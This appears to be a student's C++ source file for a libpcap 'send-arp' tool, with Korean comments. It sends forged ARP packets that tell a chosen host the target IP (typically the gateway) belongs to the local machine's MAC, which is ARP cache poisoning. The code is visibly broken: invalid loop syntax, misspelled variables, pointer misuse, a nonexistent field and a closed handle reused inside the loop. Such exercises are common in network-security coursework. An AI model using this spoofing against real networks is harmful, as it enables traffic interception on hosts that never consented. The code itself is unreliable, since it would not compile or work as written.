#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc%2 != 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char my_ip_address[16]; // IP 주소를 저장할 문자열
    char my_mac_address[18];
	char target_address[18];
	char sender_address[18];

	get_ip_address(my_ip_address);
	get_mac_address(my_mac_address);
	int fir = 2;
	int sec= 3;
	while(true):{
		EthArpPacket packet;
		send_packet(packet,"ff:ff:ff:ff:ff:ff",my_mac_address,my_ip_address,argv[fir]);
		get_packet(hadle,sender_address);
		send_packet(packet,sender_address,my_mac_address,argv[sec],argv[fir]);
		pcap_close(handle);
		sec = sec+2;
		fir = fir +2;
	}
}


// IP 주소를 가져오는 함수
void get_ip_address(char* ip_address) {
    char hostbuffer[256];
    struct hostent *host_entry;

    // 호스트 이름 가져오기
    gethostname(hostbuffer, sizeof(hostbuffer));

    // 호스트 이름으로 호스트 정보 가져오기
    host_entry = gethostbyname(hostbuffer);

    // IP 주소 가져오기
    strcpy(ip_address, inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0])));
}

// MAC 주소를 가져오는 함수
void get_mac_address(char* mac_address) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if (sock < 0) {
        perror("소켓 생성 실패");
        exit(1);
    }

    strcpy(ifr.ifr_name, "eth0"); // 이더넷 인터페이스 이름 설정

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("MAC 주소 가져오기 실패");
        close(sock);
        exit(1);
    }

    close(sock);

    sprintf(mac_address, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
}
void send_packet(EthArpPacket *packet,char *dmac,char *smac,char *sip,char *tip){
		packet.eth_.dmac_ = Mac(dmac);
		packet.eth_.smac_ = Mac(smac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(smac);
		packet.arp_.sip_ = htonl(Ip(sip));
		packet.arp_.tmac_ = Mac(dmac);
		packet.arp_.tip_ = htonl(Ip(tip));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
}
void get_packet(pcap_t *handle,char *sender_address){
	struct pcap_pkthdr *header;
	const u_char *packet;
	int res =pcap_next_ex(handle, &header, &packet);
	if (res == 0){
		return;
	}
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
			fprintf(stderr,"pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
	}
	struct EthArpPacket *ARPpacket = (EthArpPacket *)packet;
	sender_address = &ARPpacket->_.smac_;
}
